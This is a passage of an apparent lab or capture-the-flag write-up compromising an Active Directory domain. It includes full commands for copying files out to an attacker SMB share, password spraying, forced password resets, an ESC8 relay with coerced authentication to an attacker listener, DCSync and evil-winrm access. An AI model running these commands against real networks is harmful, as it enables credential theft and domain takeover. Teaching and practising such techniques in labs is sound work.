| KzyUH1D3B+9XOSCZWs/wM974QYVbu9A=
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
443/tcp   open  https?        syn-ack ttl 126
445/tcp   open  microsoft-ds? syn-ack ttl 126
464/tcp   open  kpasswd5?     syn-ack ttl 126
593/tcp   open  ncacn_http    syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: dismay.hsm0., Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: DNS:DC2.dismay.hsm, DNS:dismay.hsm, DNS:DISMAY
| Issuer: commonName=dismay-DC2-CA/domainComponent=dismay
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-12-12T13:39:44
| Not valid after:  2026-12-12T13:39:44
| MD5:   ece8:532d:5f54:8f97:a891:097c:b6f5:63f4
| SHA-1: fcd4:8621:ebd0:e262:3ac8:8cd9:8b79:ade7:a540:183a
| -----BEGIN CERTIFICATE-----
| MIIF4zCCBMugAwIBAgITMgAAAAY9M8Bkl5WiMAAAAAAABjANBgkqhkiG9w0BAQsF
| ADBFMRMwEQYKCZImiZPyLGQBGRYDaHNtMRYwFAYKCZImiZPyLGQBGRYGZGlzbWF5
| MRYwFAYDVQQDEw1kaXNtYXktREMyLUNBMB4XDTI1MTIxMjEzMzk0NFoXDTI2MTIx
| MjEzMzk0NFowADCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBALqXJXJ3
| xJ0CtRoiKqWPbC4tG6c1rILd736G8wx86mrJU3OrmrSPYVWGGu+7Ioy7+EZa0yBS
| n5ObPAxkpQU42nN4kmdxVkY5wK9A6cCzrA0EO/2EU27eykbZw3AZyr+HwqYNTvi7
| wxHehSWAk9Xuy5zQNH1lFWyNlWTfc2Su+mTBii3wLeIhbviv55lclAiIPJzRZmte
| XXiJiWLpZ+lqvWwFSpVBhJZh/pFhy+t4FYaq8B/BktVCkRMYKTSBep89mnrHAhqC
| pMgXgCi5jtlN2u2zXfS/dvVCsXAPbxpIAaWC0evgrR44PDOcNMYz5JWn/KLBNeso
| VUoz37065zcrEGECAwEAAaOCAw8wggMLMDYGCSsGAQQBgjcVBwQpMCcGHysGAQQB
| gjcVCIaL0m2Ci5EUh92XI52yC6bSAYFiASECAW4CAQAwMgYDVR0lBCswKQYIKwYB
| BQUHAwIGCCsGAQUFBwMBBgorBgEEAYI3FAICBgcrBgEFAgMFMA4GA1UdDwEB/wQE
| AwIFoDBABgkrBgEEAYI3FQoEMzAxMAoGCCsGAQUFBwMCMAoGCCsGAQUFBwMBMAwG
| CisGAQQBgjcUAgIwCQYHKwYBBQIDBTAdBgNVHQ4EFgQUgHL5yMq9PJzBGLkcldFN
| GQjUhv4wHwYDVR0jBBgwFoAUcjsiP0AlkITf7wMtDk41epYddmkwgcYGA1UdHwSB
| vjCBuzCBuKCBtaCBsoaBr2xkYXA6Ly8vQ049ZGlzbWF5LURDMi1DQSxDTj1EQzIs
| Q049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENO
| PUNvbmZpZ3VyYXRpb24sREM9ZGlzbWF5LERDPWhzbT9jZXJ0aWZpY2F0ZVJldm9j
| YXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlzdHJpYnV0aW9uUG9pbnQw
| gb4GCCsGAQUFBwEBBIGxMIGuMIGrBggrBgEFBQcwAoaBnmxkYXA6Ly8vQ049ZGlz
| bWF5LURDMi1DQSxDTj1BSUEsQ049UHVibGljJTIwS2V5JTIwU2VydmljZXMsQ049
| U2VydmljZXMsQ049Q29uZmlndXJhdGlvbixEQz1kaXNtYXksREM9aHNtP2NBQ2Vy
| dGlmaWNhdGU/YmFzZT9vYmplY3RDbGFzcz1jZXJ0aWZpY2F0aW9uQXV0aG9yaXR5
| MDAGA1UdEQEB/wQmMCSCDkRDMi5kaXNtYXkuaHNtggpkaXNtYXkuaHNtggZESVNN
| QVkwTwYJKwYBBAGCNxkCBEIwQKA+BgorBgEEAYI3GQIBoDAELlMtMS01LTIxLTEz
| NTk1MDE5NjItNDA2NDYzNDg0MS0zNTU4NTU5NzMxLTExMTQwDQYJKoZIhvcNAQEL
| BQADggEBAKvkXteyBeFfOzckwvNvzbHozt08cYhfTbI3XNBIl+gMxvcDnk0LsdOe
| fsyRGXz6R8afnilitCeew452LTtHETgsuAo90kUAk0bj9sLsACtQGHj3fDswHi3I
| HHGnhjmzqzllyBuh53eJIsXke9cnE+EMnmQxnVphBq/RSqtYqNelOQfTAQGByk5Q
| vMHVjZBWIPx9IXqjcxhWjbhPOwi/FBiYUiucXpZmti78SUYmWm0VGaSjFJU4IrQQ
| oGcjOa6XzVqToevHRisPxAsG3BIX3TMluIW4iRnpIYZSfyT/PQjl86gZ2+3htXMN
| KzyUH1D3B+9XOSCZWs/wM974QYVbu9A=
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
3268/tcp  open  ldap          syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: dismay.hsm0., Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: DNS:DC2.dismay.hsm, DNS:dismay.hsm, DNS:DISMAY
| Issuer: commonName=dismay-DC2-CA/domainComponent=dismay
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-12-12T13:39:44
| Not valid after:  2026-12-12T13:39:44
| MD5:   ece8:532d:5f54:8f97:a891:097c:b6f5:63f4
| SHA-1: fcd4:8621:ebd0:e262:3ac8:8cd9:8b79:ade7:a540:183a
| -----BEGIN CERTIFICATE-----
| MIIF4zCCBMugAwIBAgITMgAAAAY9M8Bkl5WiMAAAAAAABjANBgkqhkiG9w0BAQsF
| ADBFMRMwEQYKCZImiZPyLGQBGRYDaHNtMRYwFAYKCZImiZPyLGQBGRYGZGlzbWF5
| MRYwFAYDVQQDEw1kaXNtYXktREMyLUNBMB4XDTI1MTIxMjEzMzk0NFoXDTI2MTIx
| MjEzMzk0NFowADCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBALqXJXJ3
| xJ0CtRoiKqWPbC4tG6c1rILd736G8wx86mrJU3OrmrSPYVWGGu+7Ioy7+EZa0yBS
| n5ObPAxkpQU42nN4kmdxVkY5wK9A6cCzrA0EO/2EU27eykbZw3AZyr+HwqYNTvi7
| wxHehSWAk9Xuy5zQNH1lFWyNlWTfc2Su+mTBii3wLeIhbviv55lclAiIPJzRZmte
| XXiJiWLpZ+lqvWwFSpVBhJZh/pFhy+t4FYaq8B/BktVCkRMYKTSBep89mnrHAhqC
| pMgXgCi5jtlN2u2zXfS/dvVCsXAPbxpIAaWC0evgrR44PDOcNMYz5JWn/KLBNeso
| VUoz37065zcrEGECAwEAAaOCAw8wggMLMDYGCSsGAQQBgjcVBwQpMCcGHysGAQQB
| gjcVCIaL0m2Ci5EUh92XI52yC6bSAYFiASECAW4CAQAwMgYDVR0lBCswKQYIKwYB
| BQUHAwIGCCsGAQUFBwMBBgorBgEEAYI3FAICBgcrBgEFAgMFMA4GA1UdDwEB/wQE
| AwIFoDBABgkrBgEEAYI3FQoEMzAxMAoGCCsGAQUFBwMCMAoGCCsGAQUFBwMBMAwG
| CisGAQQBgjcUAgIwCQYHKwYBBQIDBTAdBgNVHQ4EFgQUgHL5yMq9PJzBGLkcldFN
| GQjUhv4wHwYDVR0jBBgwFoAUcjsiP0AlkITf7wMtDk41epYddmkwgcYGA1UdHwSB
| vjCBuzCBuKCBtaCBsoaBr2xkYXA6Ly8vQ049ZGlzbWF5LURDMi1DQSxDTj1EQzIs
| Q049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENO
| PUNvbmZpZ3VyYXRpb24sREM9ZGlzbWF5LERDPWhzbT9jZXJ0aWZpY2F0ZVJldm9j
| YXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlzdHJpYnV0aW9uUG9pbnQw
| gb4GCCsGAQUFBwEBBIGxMIGuMIGrBggrBgEFBQcwAoaBnmxkYXA6Ly8vQ049ZGlz
| bWF5LURDMi1DQSxDTj1BSUEsQ049UHVibGljJTIwS2V5JTIwU2VydmljZXMsQ049
| U2VydmljZXMsQ049Q29uZmlndXJhdGlvbixEQz1kaXNtYXksREM9aHNtP2NBQ2Vy
| dGlmaWNhdGU/YmFzZT9vYmplY3RDbGFzcz1jZXJ0aWZpY2F0aW9uQXV0aG9yaXR5
| MDAGA1UdEQEB/wQmMCSCDkRDMi5kaXNtYXkuaHNtggpkaXNtYXkuaHNtggZESVNN
| QVkwTwYJKwYBBAGCNxkCBEIwQKA+BgorBgEEAYI3GQIBoDAELlMtMS01LTIxLTEz
| NTk1MDE5NjItNDA2NDYzNDg0MS0zNTU4NTU5NzMxLTExMTQwDQYJKoZIhvcNAQEL
| BQADggEBAKvkXteyBeFfOzckwvNvzbHozt08cYhfTbI3XNBIl+gMxvcDnk0LsdOe
| fsyRGXz6R8afnilitCeew452LTtHETgsuAo90kUAk0bj9sLsACtQGHj3fDswHi3I
| HHGnhjmzqzllyBuh53eJIsXke9cnE+EMnmQxnVphBq/RSqtYqNelOQfTAQGByk5Q
| vMHVjZBWIPx9IXqjcxhWjbhPOwi/FBiYUiucXpZmti78SUYmWm0VGaSjFJU4IrQQ
| oGcjOa6XzVqToevHRisPxAsG3BIX3TMluIW4iRnpIYZSfyT/PQjl86gZ2+3htXMN
| KzyUH1D3B+9XOSCZWs/wM974QYVbu9A=
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
3269/tcp  open  ssl/ldap      syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: dismay.hsm0., Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: DNS:DC2.dismay.hsm, DNS:dismay.hsm, DNS:DISMAY
| Issuer: commonName=dismay-DC2-CA/domainComponent=dismay
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-12-12T13:39:44
| Not valid after:  2026-12-12T13:39:44
| MD5:   ece8:532d:5f54:8f97:a891:097c:b6f5:63f4
| SHA-1: fcd4:8621:ebd0:e262:3ac8:8cd9:8b79:ade7:a540:183a
| -----BEGIN CERTIFICATE-----
| MIIF4zCCBMugAwIBAgITMgAAAAY9M8Bkl5WiMAAAAAAABjANBgkqhkiG9w0BAQsF
| ADBFMRMwEQYKCZImiZPyLGQBGRYDaHNtMRYwFAYKCZImiZPyLGQBGRYGZGlzbWF5
| MRYwFAYDVQQDEw1kaXNtYXktREMyLUNBMB4XDTI1MTIxMjEzMzk0NFoXDTI2MTIx
| MjEzMzk0NFowADCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBALqXJXJ3
| xJ0CtRoiKqWPbC4tG6c1rILd736G8wx86mrJU3OrmrSPYVWGGu+7Ioy7+EZa0yBS
| n5ObPAxkpQU42nN4kmdxVkY5wK9A6cCzrA0EO/2EU27eykbZw3AZyr+HwqYNTvi7
| wxHehSWAk9Xuy5zQNH1lFWyNlWTfc2Su+mTBii3wLeIhbviv55lclAiIPJzRZmte
| XXiJiWLpZ+lqvWwFSpVBhJZh/pFhy+t4FYaq8B/BktVCkRMYKTSBep89mnrHAhqC
| pMgXgCi5jtlN2u2zXfS/dvVCsXAPbxpIAaWC0evgrR44PDOcNMYz5JWn/KLBNeso
| VUoz37065zcrEGECAwEAAaOCAw8wggMLMDYGCSsGAQQBgjcVBwQpMCcGHysGAQQB
| gjcVCIaL0m2Ci5EUh92XI52yC6bSAYFiASECAW4CAQAwMgYDVR0lBCswKQYIKwYB
| BQUHAwIGCCsGAQUFBwMBBgorBgEEAYI3FAICBgcrBgEFAgMFMA4GA1UdDwEB/wQE
| AwIFoDBABgkrBgEEAYI3FQoEMzAxMAoGCCsGAQUFBwMCMAoGCCsGAQUFBwMBMAwG
| CisGAQQBgjcUAgIwCQYHKwYBBQIDBTAdBgNVHQ4EFgQUgHL5yMq9PJzBGLkcldFN
| GQjUhv4wHwYDVR0jBBgwFoAUcjsiP0AlkITf7wMtDk41epYddmkwgcYGA1UdHwSB
| vjCBuzCBuKCBtaCBsoaBr2xkYXA6Ly8vQ049ZGlzbWF5LURDMi1DQSxDTj1EQzIs
| Q049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENO
| PUNvbmZpZ3VyYXRpb24sREM9ZGlzbWF5LERDPWhzbT9jZXJ0aWZpY2F0ZVJldm9j
| YXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlzdHJpYnV0aW9uUG9pbnQw
| gb4GCCsGAQUFBwEBBIGxMIGuMIGrBggrBgEFBQcwAoaBnmxkYXA6Ly8vQ049ZGlz
| bWF5LURDMi1DQSxDTj1BSUEsQ049UHVibGljJTIwS2V5JTIwU2VydmljZXMsQ049
| U2VydmljZXMsQ049Q29uZmlndXJhdGlvbixEQz1kaXNtYXksREM9aHNtP2NBQ2Vy
| dGlmaWNhdGU/YmFzZT9vYmplY3RDbGFzcz1jZXJ0aWZpY2F0aW9uQXV0aG9yaXR5
| MDAGA1UdEQEB/wQmMCSCDkRDMi5kaXNtYXkuaHNtggpkaXNtYXkuaHNtggZESVNN
| QVkwTwYJKwYBBAGCNxkCBEIwQKA+BgorBgEEAYI3GQIBoDAELlMtMS01LTIxLTEz
| NTk1MDE5NjItNDA2NDYzNDg0MS0zNTU4NTU5NzMxLTExMTQwDQYJKoZIhvcNAQEL
| BQADggEBAKvkXteyBeFfOzckwvNvzbHozt08cYhfTbI3XNBIl+gMxvcDnk0LsdOe
| fsyRGXz6R8afnilitCeew452LTtHETgsuAo90kUAk0bj9sLsACtQGHj3fDswHi3I
| HHGnhjmzqzllyBuh53eJIsXke9cnE+EMnmQxnVphBq/RSqtYqNelOQfTAQGByk5Q
| vMHVjZBWIPx9IXqjcxhWjbhPOwi/FBiYUiucXpZmti78SUYmWm0VGaSjFJU4IrQQ
| oGcjOa6XzVqToevHRisPxAsG3BIX3TMluIW4iRnpIYZSfyT/PQjl86gZ2+3htXMN
| KzyUH1D3B+9XOSCZWs/wM974QYVbu9A=
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
3389/tcp  open  ms-wbt-server syn-ack ttl 126 Microsoft Terminal Services
| ssl-cert: Subject: commonName=DC2.dismay.hsm
| Issuer: commonName=DC2.dismay.hsm
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-06-29T19:36:41
| Not valid after:  2026-12-29T19:36:41
| MD5:   a4a0:9e9e:d9a7:d8e8:1d05:037a:c5d2:6f0d
| SHA-1: f2a7:2643:f92e:85ce:ad53:e95c:b7e3:34cf:2147:30b0
| -----BEGIN CERTIFICATE-----
| MIIC4DCCAcigAwIBAgIQemTl5w8L96BHxmOjBwGTHTANBgkqhkiG9w0BAQsFADAZ
| MRcwFQYDVQQDEw5EQzIuZGlzbWF5LmhzbTAeFw0yNjA2MjkxOTM2NDFaFw0yNjEy
| MjkxOTM2NDFaMBkxFzAVBgNVBAMTDkRDMi5kaXNtYXkuaHNtMIIBIjANBgkqhkiG
| 9w0BAQEFAAOCAQ8AMIIBCgKCAQEA5Ae5Q9DZwqWRmLKg+pSEoWnWuYYj6/HHRrYt
| NWxlOFOxDi8yMMOy/veN4eih2MYr/G8L01N52KNZrOg6ycbN10kbDOEjuP9Y01DW
| HaGTYN5785XMh4r+iNq30+5t1Qo2ALl7zuGP/i9xv0ca/V0qVCkpjvUEq/2j7NnT
| O7qqZ55zApx6jy5deqXIx784baED7KqcFymUb3/sB3ZoelBjdrCX48gvbmZ+o99i
| vor1gneMdudB+pakW2YgMvJDC9l/+HOY7UHaVe/KrHyRIkpi5qjsbJLjr/VbpreQ
| Wuk1BJZ4qkqUdy9+VHXEex07xIyEVuLPlTY4cWemg/QRSIlqNQIDAQABoyQwIjAT
| BgNVHSUEDDAKBggrBgEFBQcDATALBgNVHQ8EBAMCBDAwDQYJKoZIhvcNAQELBQAD
| ggEBAEYLt/ms8Gbhjqz4YajMkMo8qktKKKCn/kC/Wa+bVftDnTeh2O/PxvGxst94
| vJxfysV10LFuUDr1MvRD7eAZS508PaDvyBeB8P83kwmyee6fXEiC18TnvKFZS61q
| NCXdPRykbYB9NrHFQNAKSokYSE9+/DRioAbo628rLJqp+OFlWttz2z5hR9dOQWiS
| 5HPLNFgn6/LcsDFTnAT6pkLitr78TRyuJXdWs70rG4J1BUKbhkTY2itlhC/PIrHH
| A4+ehzHg3fuDWcT2upR/vD5WUlEL6QGL9bmoPV3WbH+bV0Hg737SzTZHY+DbdZBH
| 7XxeiKfBA4Zha7tOeHHt7QrzQ1A=
|_-----END CERTIFICATE-----
|_ssl-date: 2026-06-30T19:44:47+00:00; 0s from scanner time.
| rdp-ntlm-info:
|   Target_Name: DISMAY
|   NetBIOS_Domain_Name: DISMAY
|   NetBIOS_Computer_Name: DC2
|   DNS_Domain_Name: dismay.hsm
|   DNS_Computer_Name: DC2.dismay.hsm
|   Product_Version: 10.0.20348
|_  System_Time: 2026-06-30T19:44:06+00:00
5985/tcp  open  http          syn-ack ttl 126 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        syn-ack ttl 126 .NET Message Framing
49664/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49675/tcp open  ncacn_http    syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0
49676/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49688/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
54103/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
59991/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
63182/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
Service Info: Host: DC2; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 0s, deviation: 0s, median: 0s
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 16466/tcp): CLEAN (Timeout)
|   Check 2 (port 48175/tcp): CLEAN (Timeout)
|   Check 3 (port 37474/udp): CLEAN (Timeout)
|   Check 4 (port 47913/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-time:
|   date: 2026-06-30T19:44:09
|_  start_date: N/A
```

### NMAP Scanning - Nexus

```python
PORT      STATE SERVICE       REASON          VERSION
80/tcp    open  http          syn-ack ttl 126 Microsoft IIS httpd 10.0
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
135/tcp   open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 126 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds? syn-ack ttl 126
3389/tcp  open  ms-wbt-server syn-ack ttl 126 Microsoft Terminal Services
|_ssl-date: 2026-06-30T19:44:52+00:00; 0s from scanner time.
| rdp-ntlm-info:
|   Target_Name: EC2AMAZ-GQCP864
|   NetBIOS_Domain_Name: EC2AMAZ-GQCP864
|   NetBIOS_Computer_Name: EC2AMAZ-GQCP864
|   DNS_Domain_Name: EC2AMAZ-GQCP864
|   DNS_Computer_Name: EC2AMAZ-GQCP864
|   Product_Version: 10.0.20348
|_  System_Time: 2026-06-30T19:44:14+00:00
| ssl-cert: Subject: commonName=EC2AMAZ-GQCP864
| Issuer: commonName=EC2AMAZ-GQCP864
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-02-06T01:27:31
| Not valid after:  2026-08-08T01:27:31
| MD5:   aa8f:0a6b:64f0:a7d5:fe26:b5fe:41ef:2da1
| SHA-1: e6bd:cc2c:f245:975b:0eb7:8847:51ce:2190:663c:3675
| -----BEGIN CERTIFICATE-----
| MIIC4jCCAcqgAwIBAgIQZtwLrxihtYFPdcqp7NSnvTANBgkqhkiG9w0BAQsFADAa
| MRgwFgYDVQQDEw9FQzJBTUFaLUdRQ1A4NjQwHhcNMjYwMjA2MDEyNzMxWhcNMjYw
| ODA4MDEyNzMxWjAaMRgwFgYDVQQDEw9FQzJBTUFaLUdRQ1A4NjQwggEiMA0GCSqG
| SIb3DQEBAQUAA4IBDwAwggEKAoIBAQCkJEI5ThnKERUFZM+oyBl6LSPPwSoKiasW
| n7ZxgBwHqcu+KFl8QHFviPuPaTFkiJ0xidFo1FtWFFOa4gIw5wNcAGUXqAZvJkn1
| oVsp45oR7+0sO5YFb58U9qHeagBMWkHfZbPRzVa1uoJySbcE3WnELyIaNGU9A87e
| RnpenLdG/ezyDMaCjttaLlNgZV5aaxxOgAhuWDf2937XRPjujPuGll9drxNWKexS
| TAPyw+ryuch6VOettyga8uTAHhJZs8/P9OUMhZMAmcDzd7AR4z985SRxyPKKZhmE
| 4aOE8pe7fX6SUAEcWYGviz3rnRDsYjuPGXD2a/3Ydy3END0W2X9ZAgMBAAGjJDAi
| MBMGA1UdJQQMMAoGCCsGAQUFBwMBMAsGA1UdDwQEAwIEMDANBgkqhkiG9w0BAQsF
| AAOCAQEAccpXihIV3Y5ZYQW8NgvuwYns1VxHq3+6/8lBo8pWw05+4YYRuM/LEysk
| uk/JC21KhtaurJyHc7B9lH2rIsidW7y0xm85BLSpLgPrh4HP24tc3alCkVDshVjl
| wQwcIdGYSKp/qv+AKTrrysw09+uaZKLVYvppvjs/BmwB7MoX+5pUbm5GlPKbWIMs
| 7lHEfffcx/nC1n2AfNWWr35b6GaESOcUAwFK1pnBAom/Re4FlUDIGXzfdh4FcYbp
| bOUj0+BtSZ0Pgqp91lnUiocUpIK7nxfyeNnO3pcJoU9SSuSu0GpYqHdHSTuPEqsJ
| voUynTg5DH6lwdWVBvjz5/pnr68MqA==
|_-----END CERTIFICATE-----
5985/tcp  open  http          syn-ack ttl 126 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
8530/tcp  open  http          syn-ack ttl 126 Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Site doesn't have a title.
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
8531/tcp  open  unknown       syn-ack ttl 126
49667/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2026-06-30T19:44:14
|_  start_date: N/A
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled but not required
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 27636/tcp): CLEAN (Timeout)
|   Check 2 (port 32783/tcp): CLEAN (Timeout)
|   Check 3 (port 53300/udp): CLEAN (Timeout)
|   Check 4 (port 17119/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: mean: 0s, deviation: 0s, median: 0s
```

### SMB Enumeration on Hosts

{% image %}

The only host with SMB signing disabled is `EC2AMAZ-GQCP864`, which leaves it open to an NTLM relay attack later if needed.

The `--generate-hosts-file` option quickly produces everything needed for the `/etc/hosts` file:

{% image2 %}

Testing the provided credentials against each host shows access only to `EC2AMAZ-GQCP864`:

{% image3 %}

### Nexus Machine Enumeration

This machine is not domain joined, as the domain output reads `(domain:EC2AMAZ-GQCP864)`, matching its own hostname rather than the AD domain. Connecting with the credentials to inspect its shares:

{% image4 %}

The notable share is `WsusContent`, which according to its remark is used by Local Publishing to place published content on this WSUS system.

A RID brute-force attack returns only a small set of local users and groups:

{% image5 %}

The open ports `8530` and `8531` confirm this is a WSUS server. They are the defaults for Windows Server Update Services, used by client machines to check for, download, and report the status of software updates from the central update server.

The `WsusContent` share itself holds only an empty file:

{% image6 %}

Trying other protocols for a pivot, such as WinRM and RDP, shows that RDP accepts the credentials:

{% image7 %}

Connecting with `xfreerdp3` using the following command: `xfreerdp3 /u:xiao.ge /p:AmBZATVjnH4qo8H4 /v:10.1.157.198`

The session opens successfully:

{% image8 %}

The Recycle Bin contains several items worth inspecting. Inside are four files: `Confidential.7z`, `Invoice_Draft`, `Meeting_Notes`, and `System_Audit`:

{% image9 %}

Transferring them starts with an SMB server on the attacker machine: `impacket-smbserver share . -username 0xd1s -password 0xd1s -smb2support`. The target then connects to that share and copies the files across:

{% image10 %}

### Investigating Files

Opening each file in turn to look for anything useful, starting with `Invoice_Draft_2026_Q2.pdf`:

{% image11 %}

It exposes a temporary user `staging_admin`, a temporary password `Spring_2026_Temp!`, and a database key `0xDEADBEEF992211`.

The next document, `Meeting_Notes_Archive.pdf`, contains the following:

{% image12 %}

It references a user named `v.marcus`, a candidate for AS-REP Roasting or a password spray.

The last document, `System_Audit_Log.pdf`, holds the following:

{% image13 %}

This document names another user, `SVC_SQL_01`. As a service account it most likely has a Service Principal Name registered, which makes it a target for a Kerberoasting attack.

The `.7z` archive prompts for a password when opened:

{% image14 %}

The password `Spring_2026_Temp!` extracts it successfully, revealing another file named `Confidential.pdf` that appears to be a penetration testing report:

{% image15 %}

The document contains a password `O0Aco9FQJQ` tied to the users `svc_scanner` and `guy.rookie`.

Validating all the discovered users with `kerbrute` shows only one as valid: `guy.rookie`:

{% image16 %}

Spraying the collected passwords against this user lands a valid hit:

{% image17 %}

### Active Directory - Domain Reconnaissance

With a valid pair of credentials, `rusthound-ce` can enumerate the domain against DC1: `rusthound-ce --domain dismay.hsm --ldapusername 'guy.rookie' --ldappassword 'O0Aco9FQJQ' --ldapfqdn DC1.dismay.hsm --ldapip 10.1.144.132 --name-server 10.1.144.132 --collectionmethod All --zip`

{% image18 %}

While the BloodHound data ingests, connecting to SYSVOL to check for any scripts or files holding useful data:

{% image19 %}

SYSVOL turns out to be empty. Returning to the BloodHound data, the current user holds `ForceChangePassword` over the `JENA.YAMAZAKI` user:

{% image20 %}

This allows resetting that account's password and taking control of it. `JENA.YAMAZAKI` in turn holds `GenericAll` over `MIKE.SILVER`, which opens up a targeted Kerberoast, a forced password change, or a Shadow Credentials attack:

{% image21 %}

`MIKE.SILVER` then carries an `AddMember` ACL over the `SHARES_OPERATORS` group:

{% image22 %}

Membership in that group grants access to the Tools share, according to its description:

{% image23 %}

### Active Directory - Privilege Escalation

Abusing the chain begins with resetting the password of `JENA.YAMAZAKI` using bloodyAD: `bloodyAD -d dismay.hsm -u 'guy.rookie' -p 'O0Aco9FQJQ' -i 10.1.144.132 set password 'JENA.YAMAZAKI' 'Password123!'`

{% image24 %}

Using that account to reset the password of `MIKE.SILVER` with the same syntax:

{% image25 %}

Adding this user to the `SHARES_OPERATORS` group: `bloodyAD -d dismay.hsm -u 'MIKE.SILVER' -p 'Password123!' -i 10.1.144.132 add groupMember 'SHARES_OPERATORS' 'MIKE.SILVER'`

{% image26 %}

Checking SMB again for the Tools share:

{% image27 %}

Connecting to the share reveals the following files:

{% image28 %}

Inspecting the `note.txt` file shows the following:

```python
From: Adrian Thompson <adrian.thompson@dismay.hsm>
To: Kali Wang <wang.kali@dismay.hsm>
Subject: FINAL WARNING - Fix that broken executable NOW

Kali,

This is the third time this month. The binary you deployed last Thursday is completely broken. Users are screaming, auditors are asking questions, and I'm the one getting heat from upstairs. You have until 17:00 tomorrow to deliver a working file or you're done. HR is already on standby. I've had it with your "it works on my machine" excuses.

Get it fixed, push the new file. No more chances.

I'm not bluffing.

- Adrian
IT Security Administrator
DISMAY Ltd.
```

Two options present themselves: replace the `.exe` binaries or inspect them for DLL hijacking opportunities. The other avenue is enumerating Active Directory Certificate Services for vulnerable templates: `certipy-ad find -u MIKE.SILVER@dismay.hsm -p 'Password123!' -dc-ip 10.1.144.132 -vulnerable -stdout`

{% image29 %}

### ADCS - ESC8 Exploitation

{% image30 %}

DC2 is vulnerable to ESC8, where the CA web enrollment endpoint accepts NTLM authentication. Self-relay is not allowed, so the approach is to coerce authentication out of DC1 and relay it to DC2:

```python
certipy-ad relay -target 'http://DC2.dismay.hsm' -template 'DomainController'
```

The coercion is triggered with netexec: `poetry run NetExec smb DC1.dismay.hsm -u 'MIKE.SILVER' -p 'Password123!' -M coerce_plus -o LISTENER=10.200.68.77`

With the resulting `dc1.pfx` certificate, authenticating to recover the NT hash of the DC1 machine account:

```python
 certipy-ad auth -pfx dc1.pfx -dc-ip 10.1.144.132
```

{% image31 %}

This hash enables a DCSync attack to extract the NT hash of the Administrator:

{% image32 %}

With the Administrator hash, connecting over `evil-winrm` to collect the flags:

→ DC1: user.txt flag

{% image33 %}

→ DC2: root.txt flag

{% image34 %}